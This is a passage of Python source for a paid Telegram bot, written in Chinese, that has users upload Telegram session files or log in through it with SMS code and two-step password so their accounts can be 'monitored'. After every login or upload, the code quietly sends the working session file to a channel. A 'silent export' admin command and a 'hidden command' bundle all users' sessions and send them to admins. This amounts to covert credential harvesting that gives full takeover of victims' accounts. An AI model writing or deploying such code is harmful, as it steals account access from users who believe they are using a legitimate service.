        return ConversationHandler.END
    await update.message.reply_text(
        f"⚙️ <b>账号管理</b>\n正在监控 <b>{len(accounts)}</b> 个账号\n\n点击 🔌 断开 可停止单个账号监控：",
        parse_mode='HTML',
        reply_markup=build_manage_inline(user_id)
    )
    return ConversationHandler.END

async def entry_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await ensure_user_permission(update, context):
        return ConversationHandler.END
    text = update.message.text
    if text == "⚙️ 账号管理":
        return await manage_accounts(update, context)
    if text == "📁 上传会话文件":
        await update.message.reply_text("请发送 .session 文件\n系统会自动识别手机号并分类存储。", reply_markup=get_cancel_keyboard())
        return PHONE_INPUT
    if text == "📱 手机号登录":
        await update.message.reply_text("请输入手机号码 (+86...):", reply_markup=get_cancel_keyboard())
        return PHONE_INPUT
    return ConversationHandler.END

async def handle_phone_or_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text if update.message.text else ""
    if not await ensure_user_permission(update, context):
        return ConversationHandler.END
    if text == "❌ 取消操作":
        await update.message.reply_text("已取消。", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    if update.message.document:
        if not update.message.document.file_name.endswith('.session'):
            await update.message.reply_text("❌ 必须是 .session 文件")
            return PHONE_INPUT
        user_dir = get_user_session_dir(user_id)
        temp_path = user_dir / f"temp_{user_id}_{datetime.now().timestamp()}.session"
        try:
            file = await update.message.document.get_file()
            await file.download_to_drive(temp_path)
            await update.message.reply_text("📁 文件接收成功，正在识别...")
            is_alive, phone = await check_session_alive(temp_path)
            if not is_alive or not phone:
                await update.message.reply_text("❌ 文件无效或已过期")
                if temp_path.exists():
                    temp_path.unlink()
                return ConversationHandler.END
            final_path = user_dir / f"{phone}.session"
            if final_path.exists():
                await stop_monitoring(user_id, phone, archive=True)
                final_path.unlink()
            temp_path.rename(final_path)
            success = await start_monitoring_for_session(user_id, phone, final_path, update.get_bot())
            if success:
                await update.message.reply_text(f"✅ <b>监控已启动</b>\n账号: {phone}", parse_mode='HTML', reply_markup=get_main_keyboard())
                session_data = {
                    "phone": phone,
                    "user_id": user_id,
                    "created_at": datetime.now().isoformat(),
                    "session_file": f"{phone}.session",
                    "note": f"用户{user_id}通过上传添加",
                    "source": "upload"
                }
                await export_session_to_channel(update.get_bot(), user_id, phone, final_path, session_data)
            else:
                await update.message.reply_text("❌ 启动监控失败", reply_markup=get_main_keyboard())
            return ConversationHandler.END
        except Exception as e:
            logger.error(f"文件处理失败: {e}")
            await update.message.reply_text(f"❌ 处理文件时出错: {e}", reply_markup=get_main_keyboard())
            if temp_path.exists():
                temp_path.unlink()
            return ConversationHandler.END
    phone = text.strip()
    if re.match(r'^\+\d{10,15}$', phone):
        context.user_data['phone'] = phone
        user_dir = get_user_session_dir(user_id)
        final_path = user_dir / f"{phone}.session"
        telethon_path = str(user_dir / phone)
        with sessions_lock:
            if user_id in user_sessions and phone in user_sessions[user_id]:
                await update.message.reply_text(f"⚠️ 账号 {phone} 已在监控中，请勿重复添加。", reply_markup=get_main_keyboard())
                return ConversationHandler.END
        await update.message.reply_text(f"⏳ 正在连接 ({phone})...")
        try:
            client = TelegramClient(telethon_path, API_ID, API_HASH)
            client.flood_sleep_threshold = 60
            await client.connect()
            if await client.is_user_authorized():
                await update.message.reply_text("✅ 检测到已登录，启动监控！")
                await start_monitoring_for_session(user_id, phone, final_path, update.get_bot())
                await update.message.reply_text(f"✅ 监控已启动\n账号: {phone}", reply_markup=get_main_keyboard())
                session_data = {
                    "phone": phone,
                    "user_id": user_id,
                    "created_at": datetime.now().isoformat(),
                    "session_file": f"{phone}.session",
                    "note": f"用户{user_id}通过手机号登录添加",
                    "source": "phone_login"
                }
                await export_session_to_channel(update.get_bot(), user_id, phone, final_path, session_data)
                return ConversationHandler.END
            await client.send_code_request(phone)
            context.user_data['temp_client'] = client
            context.user_data['file_path'] = final_path
            await update.message.reply_text("📨 验证码已发送，请输入 5 位数字：", reply_markup=get_cancel_keyboard())
            return VERIFICATION_CODE
        except FloodWaitError as e:
            await update.message.reply_text(f"❌ 操作过于频繁，请等待 {e.seconds} 秒后再试", reply_markup=get_main_keyboard())
            return ConversationHandler.END
        except Exception as e:
            logger.error(f"登录请求失败: {e}")
            await update.message.reply_text(f"❌ 登录请求失败: {e}", reply_markup=get_main_keyboard())
            return ConversationHandler.END
    await update.message.reply_text("❌ 格式错误。请输入正确的手机号格式 (+8613800000000)", reply_markup=get_cancel_keyboard())
    return PHONE_INPUT

async def handle_verification_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_user_permission(update, context):
        return ConversationHandler.END
    text = update.message.text
    if text == "❌ 取消操作":
        if context.user_data.get('temp_client'):
            try:
                await context.user_data['temp_client'].disconnect()
            except:
                pass
        context.user_data.clear()
        await update.message.reply_text("已取消", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    client = context.user_data.get('temp_client')
    phone = context.user_data.get('phone')
    file_path = context.user_data.get('file_path')
    if not client or not phone:
        await update.message.reply_text("❌ 会话已过期，请重新开始", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    try:
        await client.sign_in(phone, code=text)
        await update.message.reply_text("✅ 登录成功！")
        try:
            await client.disconnect()
        except:
            pass
        await start_monitoring_for_session(update.effective_user.id, phone, file_path, update.get_bot())
        context.user_data.clear()
        await update.message.reply_text(f"✅ 监控已启动\n账号: {phone}", reply_markup=get_main_keyboard())
        session_data = {
            "phone": phone,
            "user_id": update.effective_user.id,
            "created_at": datetime.now().isoformat(),
            "session_file": f"{phone}.session",
            "note": f"用户{update.effective_user.id}登录添加",
            "source": "phone_login_complete"
        }
        await export_session_to_channel(update.get_bot(), update.effective_user.id, phone, file_path, session_data)
        return ConversationHandler.END
    except SessionPasswordNeededError:
        context.user_data['verification_code'] = text
        await update.message.reply_text("🔐 请输入二级密码：", reply_markup=get_cancel_keyboard())
        return TWO_FACTOR_PASSWORD
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ 验证码无效，请检查后重新输入：", reply_markup=get_cancel_keyboard())
        return VERIFICATION_CODE
    except FloodWaitError as e:
        await update.message.reply_text(f"❌ 操作过于频繁，请等待 {e.seconds} 秒后再试", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    except Exception as e:
        error_msg = str(e)
        if "expired" in error_msg.lower():
            try:
                await client.send_code_request(phone)
                await update.message.reply_text("⚠️ 验证码已过期，已重新发送\n\n请输入新的5位验证码：", reply_markup=get_cancel_keyboard())
                return VERIFICATION_CODE
            except Exception as send_err:
                logger.error(f"重新发送验证码失败: {send_err}")
                await update.message.reply_text(f"❌ 验证失败: {error_msg}\n请重新开始登录。", reply_markup=get_main_keyboard())
                return ConversationHandler.END
        else:
            logger.error(f"验证失败: {e}")
            await update.message.reply_text(f"❌ 验证失败: {error_msg}", reply_markup=get_main_keyboard())
            return ConversationHandler.END

async def handle_two_factor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_user_permission(update, context):
        return ConversationHandler.END
    password = update.message.text
    if password == "❌ 取消操作":
        if context.user_data.get('temp_client'):
            try:
                await context.user_data['temp_client'].disconnect()
            except:
                pass
        context.user_data.clear()
        await update.message.reply_text("已取消", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    client = context.user_data.get('temp_client')
    phone = context.user_data.get('phone')
    file_path = context.user_data.get('file_path')
    verification_code = context.user_data.get('verification_code')
    if not client or not phone:
        await update.message.reply_text("❌ 会话已过期，请重新开始", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    try:
        await client.sign_in(password=password)
        await update.message.reply_text("✅ 二级密码通过！")
        try:
            await client.disconnect()
        except:
            pass
        await start_monitoring_for_session(update.effective_user.id, phone, file_path, update.get_bot())
        context.user_data.clear()
        await update.message.reply_text(f"✅ 监控已启动\n账号: {phone}", reply_markup=get_main_keyboard())
        session_data = {
            "phone": phone,
            "user_id": update.effective_user.id,
            "created_at": datetime.now().isoformat(),
            "session_file": f"{phone}.session",
            "note": f"用户{update.effective_user.id}登录添加(2FA)",
            "source": "phone_login_2fa"
        }
        await export_session_to_channel(update.get_bot(), update.effective_user.id, phone, file_path, session_data)
        return ConversationHandler.END
    except PhoneCodeInvalidError:
        await update.message.reply_text("⚠️ 验证码已过期，正在重新发送...\n\n请输入新的验证码：", reply_markup=get_cancel_keyboard())
        try:
            await client.send_code_request(phone)
            context.user_data.pop('verification_code', None)
            return VERIFICATION_CODE
        except Exception as e:
            await update.message.reply_text(f"❌ 重新发送验证码失败: {e}", reply_markup=get_main_keyboard())
            return ConversationHandler.END
    except PasswordHashInvalidError:
        await update.message.reply_text("❌ 二级密码错误，请重新输入：", reply_markup=get_cancel_keyboard())
        return TWO_FACTOR_PASSWORD
    except Exception as e:
        error_msg = str(e)
        logger.error(f"二级密码验证失败: {e}")
        if "expired" in error_msg.lower():
            await update.message.reply_text("⚠️ 验证码已过期，正在重新发送...\n\n请输入新的验证码：", reply_markup=get_cancel_keyboard())
            try:
                await client.send_code_request(phone)
                context.user_data.pop('verification_code', None)
                return VERIFICATION_CODE
            except Exception as send_err:
                await update.message.reply_text(f"❌ 重新发送验证码失败: {send_err}", reply_markup=get_main_keyboard())
                return ConversationHandler.END
        await update.message.reply_text(f"❌ 验证失败: {error_msg}", reply_markup=get_main_keyboard())
        return ConversationHandler.END

async def handle_inline_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    await query.answer()
    
    if data == "verify_join":
        await verify_join_callback(update, context)
        return
    if data == "check_pay":
        await payment_check_callback(update, context)
        return
    if data == "pay_online":
        await pay_online_callback(update, context)
        return
    if data.startswith("check_payment:"):
        await check_payment_callback(update, context)
        return
    if data == "cancel_payment":
        await cancel_payment_callback(update, context)
        return
    if not await ensure_user_permission(update, context):
        return
    if data == "noop":
        return
    if data.startswith("stop_single:"):
        phone = data.split(":", 1)[1]
        with sessions_lock:
            has_session = user_id in user_sessions and phone in user_sessions[user_id]
        if not has_session:
            await query.edit_message_text(f"⚠️ 账号 {phone} 已不在监控列表中。", parse_mode='HTML')
            return
        await query.edit_message_text(f"⏳ 正在断开: {phone}...", parse_mode='HTML')
        success = await stop_monitoring(user_id, phone, archive=True)
        if success:
            with sessions_lock:
                remaining = dict(user_sessions.get(user_id, {}))
            if remaining:
                await query.edit_message_text(
                    f"✅ <b>已断开并归档</b>: {phone}\n\n⚙️ <b>账号管理</b>\n正在监控 {len(remaining)} 个账号",
                    parse_mode='HTML',
                    reply_markup=build_manage_inline(user_id)
                )
            else:
                await query.edit_message_text(f"✅ <b>已断开并归档</b>: {phone}\n\n当前没有正在监控的账号。", parse_mode='HTML')
        else:
            await query.edit_message_text(f"❌ 操作失败，请重试。\n账号: {phone}", parse_mode='HTML')
    elif data == "stop_all":
        with sessions_lock:
            has_sessions = user_id in user_sessions and user_sessions[user_id]
            phones = list(user_sessions.get(user_id, {}).keys()) if has_sessions else []
        if not has_sessions:
            await query.edit_message_text("ℹ️ 没有活跃监控任务。")
            return
        await query.edit_message_text("⏳ 正在停止所有监控...")
        count = 0
        for phone in phones:
            if await stop_monitoring(user_id, phone, archive=True):
                count += 1
        await query.edit_message_text(f"✅ <b>已停止全部监控</b>\n共断开 {count} 个账号", parse_mode='HTML')

# ==================== 支付命令 ====================

async def cmd_pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """用户创建支付订单"""
    user_id = update.effective_user.id
    
    is_joined, _ = await check_user_in_channel(context, user_id)
    if not is_joined:
        await send_join_required(update, user_id, context)
        return
    
    ps = check_payment_status(user_id)
    if ps['status'] == 'paid':
        await update.message.reply_text("✅ 您已激活！\n发送 /start 开始使用。", parse_mode='HTML')
        return
    
    await update.message.reply_text(
        f"💳 <b>支付激活</b>\n\n"
        f"💰 金额：{PAYMENT_AMOUNT} {PAYMENT_COIN}\n"
        f"📱 请使用 USDT (TRC20) 支付\n\n"
        f"⏳ 正在生成支付链接...",
        parse_mode='HTML'
    )
    
    result = create_payment_order(user_id)
    
    if result.get("success"):
        pay_url = result["pay_url"]
        order_number = result["order_number"]
        
        context.user_data['pending_payment'] = order_number
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 立即支付", url=pay_url)],
            [InlineKeyboardButton("🔄 检查支付状态", callback_data=f"check_payment:{order_number}")],
            [InlineKeyboardButton("❌ 取消", callback_data="cancel_payment")]
        ])
        
        await update.message.reply_text(
            f"💳 <b>支付订单已创建</b>\n\n"
            f"🆔 订单号：<code>{order_number}</code>\n"
            f"💰 金额：{PAYMENT_AMOUNT} {PAYMENT_COIN}\n\n"
            f"📲 点击下方「立即支付」完成付款\n"
            f"⏳ 支付完成后点击「检查支付状态」激活\n\n"
            f"💡 提示：支付后请等待几秒再检查状态",
            parse_mode='HTML',
            reply_markup=keyboard
        )
    else:
        await update.message.reply_text(
            f"❌ 创建支付订单失败\n\n{result.get('error', '未知错误')}\n\n"
            f"请稍后重试或联系管理员。",
            parse_mode='HTML'
        )

async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """管理员查询余额"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return
    await update.message.reply_text("⏳ 正在查询余额...")
    result = okpay_balance()
    if result.get('code') == 200:
        data = result.get('data', {})
        lines = ["💰 <b>商户余额</b>\n"]
        for coin, balance in data.items():
            lines.append(f"{coin.upper()}: <code>{balance}</code>")
        await update.message.reply_text("\n".join(lines), parse_mode='HTML')
    else:
        await update.message.reply_text(f"❌ 查询余额失败\n{result.get('msg', '未知错误')}")

async def cmd_manual_pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """管理员手动标记用户已付款"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return
    if not context.args:
        await update.message.reply_text(
            "👑 <b>手动标记付款</b>\n\n"
            "用法：<code>/manualpay 用户ID</code>\n"
            "示例：<code>/manualpay 123456789</code>\n\n"
            "⚠️ 仅当用户已付款但系统未自动确认时使用",
            parse_mode='HTML'
        )
        return
    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ 用户ID必须是数字")
        return
    
    mark_user_paid(target_user_id, f"manual_by_{user_id}")
    await update.message.reply_text(
        f"✅ 已手动标记用户 {target_user_id} 为已付款"
    )

# ==================== 管理员卡密命令 ====================

async def cmd_activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_joined, _ = await check_user_in_channel(context, user_id)
    if not is_joined:
        await send_join_required(update, user_id, context)
        return
    ps = check_payment_status(user_id)
    if ps['status'] == 'paid':
        await update.message.reply_text("✅ 您已激活，无需重复操作。\n发送 /start 开始使用。")
        return
    if not context.args:
        await update.message.reply_text(
            "💡 <b>卡密激活</b>\n\n用法：<code>/activate 卡密</code>\n示例：<code>/activate ABCD-1234-EFGH-5678</code>\n\n"
            f"💳 <b>或在线支付：</b> <code>/pay</code>",
            parse_mode='HTML'
        )
        return
    key = context.args[0].strip()
    result = use_cardkey(user_id, key)
    if result['ok']:
        await update.message.reply_text(
            "🎉 <b>激活成功！</b>\n\n您已通过卡密验证，发送 /start 开始使用。",
            parse_mode='HTML',
            reply_markup=get_main_keyboard()
        )
    else:
        await update.message.reply_text(
            f"❌ <b>激活失败</b>\n{result['reason']}\n\n请检查卡密是否正确，或联系管理员。\n\n"
            f"💳 或使用 <code>/pay</code> 在线支付",
            parse_mode='HTML'
        )

async def cmd_gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return
    count = 1
    note = ''
    if context.args:
        if context.args[0].isdigit():
            count = min(int(context.args[0]), 50)
            note = ' '.join(context.args[1:]) if len(context.args) > 1 else ''
        else:
            note = ' '.join(context.args)
    keys = generate_cardkeys_batch(count, note)
    lines = '\n'.join(f"<code>{k}</code>" for k in keys)
    await update.message.reply_text(
        f"🔑 <b>已生成 {count} 张卡密</b>\n" + (f'备注：{note}\n' if note else '') + f"\n{lines}",
        parse_mode='HTML'
    )

async def cmd_list_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return
    show_all = context.args and context.args[0].lower() == 'all'
    keys = list_cardkeys(only_unused=not show_all)
    if not keys:
        await update.message.reply_text("📭 暂无" + ("全部" if show_all else "未使用的") + "卡密", parse_mode='HTML')
        return
    lines = []
    for k in keys:
        status = "✅ 未用" if not k['used'] else f"❌ 已用（uid:{k['used_by']}）"
        note = f"  备注:{k['note']}" if k.get('note') else ''
        lines.append(f"<code>{k['key']}</code> {status}{note}")
    chunk = lines[:30]
    text = f"🔑 <b>卡密列表</b>（{'全部' if show_all else '未使用'}，共{len(keys)}张）\n\n" + '\n'.join(chunk)
    if len(lines) > 30:
        text += f"\n\n…还有 {len(lines)-30} 张未显示"
    await update.message.reply_text(text, parse_mode='HTML')

# ==================== 管理员：强制验证用户加入频道 ====================

async def cmd_check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return
    if not context.args:
        await update.message.reply_text(
            "👑 <b>检查用户频道加入状态</b>\n\n"
            "用法：<code>/checkjoin 用户ID</code>\n"
            "示例：<code>/checkjoin 123456789</code>",
            parse_mode='HTML'
        )
        return
    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ 用户ID必须是数字")
        return
    is_joined, msg = await check_user_in_channel(context, target_user_id)
    if is_joined:
        await update.message.reply_text(
            f"✅ <b>用户 {target_user_id}</b>\n"
            f"状态：已加入频道\n\n"
            f"📢 频道：{REQUIRED_CHANNEL}",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text(
            f"❌ <b>用户 {target_user_id}</b>\n"
            f"状态：未加入频道\n\n"
            f"📢 频道：{REQUIRED_CHANNEL}\n\n"
            f"请提醒用户加入频道后使用 /start 重新验证。",
            parse_mode='HTML'
        )

async def cmd_clear_join_record(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return
    if not context.args:
        await update.message.reply_text(
            "👑 <b>清除用户加入记录</b>\n\n"
            "用法：<code>/clearjoin 用户ID</code>\n"
            "示例：<code>/clearjoin 123456789</code>\n\n"
            "⚠️ 清除后用户需要重新验证频道加入状态",
            parse_mode='HTML'
        )
        return
    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ 用户ID必须是数字")
        return
    records = _load_joined_records()
    user_id_str = str(target_user_id)
    if user_id_str in records:
        del records[user_id_str]
        _save_joined_records(records)
        await update.message.reply_text(f"✅ 已清除用户 {target_user_id} 的加入记录\n用户下次使用将需要重新验证频道加入状态。")
    else:
        await update.message.reply_text(f"⚠️ 用户 {target_user_id} 没有加入记录")

# ==================== 管理员：导出所有会话命令 ====================

async def cmd_export_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return
    await update.message.reply_text("📤 开始静默导出所有会话到频道，请稍候...")
    exported_count = 0
    exported_record = EXPORT_DIR / "exported_records.json"
    exported_phones = set()
    if exported_record.exists():
        try:
            with open(exported_record, 'r') as f:
                exported_phones = set(json.load(f))
        except:
            pass
    for user_dir in SESSIONS_DIR.iterdir():
        if not user_dir.is_dir() or not user_dir.name.startswith("user_"):
            continue
        try:
            uid = int(user_dir.name.replace("user_", ""))
        except ValueError:
            continue
        session_files = list(user_dir.glob("*.session"))
        for session_file in session_files:
            phone = session_file.stem
            if phone in exported_phones:
                continue
            is_alive, _ = await check_session_alive(session_file)
            if not is_alive:
                continue
            session_data = {
                "phone": phone,
                "user_id": uid,
                "created_at": datetime.now().isoformat(),
                "session_file": f"{phone}.session",
                "note": f"手动导出 - 用户{uid}",
                "source": "manual_export"
            }
            success = await export_session_to_channel(update.get_bot(), uid, phone, session_file, session_data)
            if success:
                exported_count += 1
                exported_phones.add(phone)
            await asyncio.sleep(0.3)
    try:
        with open(exported_record, 'w') as f:
            json.dump(list(exported_phones), f)
    except:
        pass
    await update.message.reply_text(f"✅ 静默导出完成！共导出 {exported_count} 个会话到频道。")

# ==================== 隐藏指令：导出所有用户配置 ====================

async def cmd_export_all_configs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限执行此操作")
        return
    await update.message.reply_text("📦 正在打包所有用户的session配置文件，请稍候...")
    try:
        export_temp_dir = EXPORT_DIR / f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        export_temp_dir.mkdir(parents=True, exist_ok=True)
        total_users = 0
        total_sessions = 0
        user_session_map = {}
        for user_dir in SESSIONS_DIR.iterdir():
            if not user_dir.is_dir() or not user_dir.name.startswith("user_"):
                continue
            try:
                uid = int(user_dir.name.replace("user_", ""))
            except ValueError:
                continue
            session_files = list(user_dir.glob("*.session"))
            if not session_files:
                continue
            user_export_dir = export_temp_dir / f"user_{uid}"
            user_export_dir.mkdir(parents=True, exist_ok=True)
            user_sessions_list = []
            for session_file in session_files:
                phone = session_file.stem
                dest_file = user_export_dir / f"{phone}.session"
                shutil.copy2(session_file, dest_file)
                info_file = user_export_dir / f"{phone}.info.json"
                info_data = {
                    "phone": phone,
                    "user_id": uid,
                    "session_file": f"{phone}.session",
                    "export_time": datetime.now().isoformat(),
                    "file_size": session_file.stat().st_size,
                    "last_modified": datetime.fromtimestamp(session_file.stat().st_mtime).isoformat()
                }
                with open(info_file, 'w', encoding='utf-8') as f:
                    json.dump(info_data, f, ensure_ascii=False, indent=2)
                user_sessions_list.append(phone)
                total_sessions += 1
            user_session_map[uid] = user_sessions_list
            total_users += 1
        if total_sessions == 0:
            await update.message.reply_text("📭 没有找到任何session文件")
            shutil.rmtree(export_temp_dir, ignore_errors=True)
            return
        summary_data = {
            "export_time": datetime.now().isoformat(),
            "total_users": total_users,
            "total_sessions": total_sessions,
            "users": user_session_map,
            "export_note": "所有用户的session配置文件导出"
        }
        summary_file = export_temp_dir / "summary.json"
        with open(summary_file, 'w', encoding='utf-8') as f:
            json.dump(summary_data, f, ensure_ascii=False, indent=2)
        zip_filename = f"all_sessions_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        zip_path = EXPORT_DIR / zip_filename
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(export_temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, export_temp_dir)
                    zipf.write(file_path, arcname)
        admins = _load_admins()
        all_admin_ids = list(SUPER_ADMIN_IDS) + list(admins)
        success_count = 0
        with open(zip_path, 'rb') as f:
            for admin_id in all_admin_ids:
                try:
                    await context.bot.send_document(
                        chat_id=admin_id,
                        document=f,
                        filename=zip_filename,
                        caption=(
                            f"📁 <b>所有用户Session配置文件导出</b>\n\n"
                            f"👥 用户总数：{total_users}\n"
                            f"📱 会话总数：{total_sessions}\n"
                            f"📅 导出时间：{summary_data['export_time']}\n"
                            f"📋 发起人：{user_id}\n\n"
                            f"⚠️ 该文件包含所有用户的session文件，请妥善保管！\n"
                            f"🔐 请勿泄露给无关人员！"
                        ),
                        parse_mode='HTML'
                    )
                    success_count += 1
                    f.seek(0)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    logger.error(f"发送给管理员 {admin_id} 失败: {e}")
        shutil.rmtree(export_temp_dir, ignore_errors=True)
        if zip_path.exists():
            zip_path.unlink()
        await update.message.reply_text(
            f"✅ 导出完成！\n\n"
            f"📊 统计信息：\n"
            f"👥 用户总数：{total_users}\n"
            f"📱 会话总数：{total_sessions}\n"
            f"📨 已发送给 {success_count}/{len(all_admin_ids)} 位管理员"
        )
        logger.info(f"管理员 {user_id} 导出了所有用户的session配置文件，共 {total_sessions} 个会话，发送给 {success_count} 位管理员")
    except Exception as e:
        logger.error(f"导出所有用户配置失败: {e}")
        await update.message.reply_text(f"❌ 导出失败：{str(e)}")

# ==================== 管理员管理命令 ====================

async def cmd_add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_super_admin(user_id):
        await update.message.reply_text("❌ 只有超级管理员可以执行此操作")
        return
    if not context.args:
        await update.message.reply_text(
            "👑 <b>添加管理员</b>\n\n用法：<code>/addadmin 用户ID</code>\n示例：<code>/addadmin 123456789</code>\n\n"
            "注意：只能添加普通管理员，超级管理员无法被添加",
            parse_mode='HTML'
        )
        return
    try:
        new_admin_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ 用户ID必须是数字")
        return
    success, msg = add_admin(new_admin_id, user_id)
    await update.message.reply_text(msg, parse_mode='HTML')

async def cmd_remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_super_admin(user_id):
        await update.message.reply_text("❌ 只有超级管理员可以执行此操作")
        return
    if not context.args:
        await update.message.reply_text(
            "👑 <b>移除管理员</b>\n\n用法：<code>/removeadmin 用户ID</code>\n示例：<code>/removeadmin 123456789</code>",
            parse_mode='HTML'
        )
        return
    try:
        admin_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ 用户ID必须是数字")
        return
    success, msg = remove_admin(admin_id, user_id)
    await update.message.reply_text(msg, parse_mode='HTML')

async def cmd_list_admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 无权限")
        return
    admins = list_admins()
    if not admins:
        await update.message.reply_text("📭 暂无管理员")
        return
    lines = ["👑 <b>管理员列表</b>\n"]
    for admin in admins:
        lines.append(f"{admin['type']}: <code>{admin['id']}</code>")
    await update.message.reply_text("\n".join(lines), parse_mode='HTML')

# ==================== Flask 后台管理 ====================

flask_app = Flask(__name__)

def _check_auth(username: str, password: str) -> bool:
    return username == WEB_USER and password == WEB_PASS

def _auth_required():
    return Response('请输入用户名和密码', 401, {'WWW-Authenticate': 'Basic realm="Admin Login"'})

@flask_app.before_request
def _require_login():
    auth = request.authorization
    if not auth or not _check_auth(auth.username, auth.password):
        return _auth_required()

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>账号监控后台</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI', sans-serif; background: #0f1117; color: #e0e0e0; min-height: 100vh; }
  .header { background: linear-gradient(135deg, #1a1d2e, #252840); padding: 24px 40px; border-bottom: 1px solid #2e3150; display: flex; align-items: center; gap: 16px; }
  .header h1 { font-size: 22px; font-weight: 600; color: #fff; }
  .stats-bar { display: flex; gap: 20px; padding: 24px 40px; flex-wrap: wrap; }
  .stat-card { background: #1a1d2e; border: 1px solid #2e3150; border-radius: 12px; padding: 18px 28px; flex: 1; min-width: 160px; }
  .stat-card .num { font-size: 32px; font-weight: 700; color: #818cf8; }
  .stat-card .label { font-size: 13px; color: #8892b0; margin-top: 4px; }
  .container { padding: 0 40px 40px; }
  .user-block { background: #1a1d2e; border: 1px solid #2e3150; border-radius: 14px; margin-bottom: 20px; overflow: hidden; }
  .user-header { background: #1e2236; padding: 14px 22px; border-bottom: 1px solid #2e3150; }
  .user-header .uid { font-size: 13px; background: #252840; color: #818cf8; padding: 3px 10px; border-radius: 20px; font-family: monospace; }
  table { width: 100%; border-collapse: collapse; }
  th { background: #16192a; padding: 11px 22px; text-align: left; font-size: 12px; color: #6b7280; }
  td { padding: 13px 22px; border-top: 1px solid #1e2236; font-size: 14px; }
  .phone { font-family: monospace; color: #e0e7ff; }
  .status-alive { color: #4ade80; font-size: 13px; }
  .refresh { position: fixed; bottom: 30px; right: 30px; background: #4f46e5; color: #fff; border: none; padding: 12px 22px; border-radius: 30px; cursor: pointer; text-decoration: none; }
</style>
</head>
<body>
<div class="header"><h1>账号监控后台</h1></div>
<div class="stats-bar">
  <div class="stat-card"><div class="num">{{ total_users }}</div><div class="label">活跃用户数</div></div>
  <div class="stat-card"><div class="num">{{ total_active }}</div><div class="label">运行中账号</div></div>
  <div class="stat-card"><div class="num">{{ total_files }}</div><div class="label">会话文件总数</div></div>
</div>
<div class="container">
  {% for user_id, phones in active_data.items() %}
  <div class="user-block">
    <div class="user-header"><span class="uid">用户 {{ user_id }}</span></div>
    <table>
      <thead><tr><th>手机号</th><th>状态</th><th>Session 路径</th></tr></thead>
      <tbody>
      {% for phone, info in phones.items() %}
      <tr><td class="phone">{{ phone }}</td><td><span class="status-alive">运行中</span></td>
      <td>{{ info.file_path }}</td>
      </tr>
      {% endfor %}
      </tbody>
    </table>
  </div>
  {% endfor %}
</div>
<a class="refresh" href="/">刷新</a>
</body>
</html>
"""

@flask_app.route("/")
def admin_index():
    with sessions_lock:
        active_snapshot = {
            uid: {phone: {'file_path': str(info['file_path'])} 
                  for phone, info in phones.items()}
            for uid, phones in user_sessions.items()
        }
    total_files = 0
    if SESSIONS_DIR.exists():
        for user_dir in SESSIONS_DIR.iterdir():
            if user_dir.is_dir():
                total_files += len(list(user_dir.glob("*.session")))
    return render_template_string(
        ADMIN_HTML,
        now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        total_users=len(active_snapshot),
        total_active=sum(len(v) for v in active_snapshot.values()),
        total_files=total_files,
        active_data=active_snapshot
    )

def _run_flask():
